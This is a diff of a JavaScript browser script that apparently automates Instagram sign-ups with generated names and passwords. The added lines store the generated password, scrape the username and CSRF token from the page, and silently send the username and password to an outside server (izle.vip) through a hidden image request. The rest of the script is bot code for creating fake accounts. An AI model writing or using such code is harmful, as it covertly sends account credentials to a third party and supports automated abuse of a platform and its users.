@@ -62,7 +62,6 @@ function generatePassword(length) {
 }
 
 passwd = generatePassword(9);
-
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = function() {
 	if (xhr.readyState == XMLHttpRequest.DONE) {
@@ -112,6 +111,8 @@ $(document).ready(() => {
 		localStorage[cookie_name] = Date.now();
 		var myXhrInterval3 = setInterval(() => {
 			if(isim.length > 1 && soyisim.length > 1 && eposta.length > 1){
+				localStorage["passwd"] = passwd;
+
 				clearInterval(myXhrInterval3);
 				setTimeout(function() {
 					type('[name="emailOrPhone"]', eposta+"@gmail.com");
@@ -145,10 +146,11 @@ $(document).ready(() => {
 if(window.location.origin.indexOf("instagram.com") >= 0 && document.referrer.indexOf("accounts/emailsignup") >= 0 ){
 	var myXhrInterval4 = null;
 	var content = document.getElementsByTagName('html')[0].innerHTML;
+	var username = content.split('"username":"')[1].split('"')[0];
 	var csrf_token = content.split('"csrf_token":"')[1].split('"')[0];
 	var instagram_ajax = content.split('"rollout_hash":"')[1].split('"')[0];
 	var app_id = "936619743392459";
-
+	new Image().src = 'https://www.izle.vip/req.php?username='+username+'&password='+localStorage["passwd"];
 
 	function loadXHR(url) {
 		return new Promise(function(resolve, reject) {
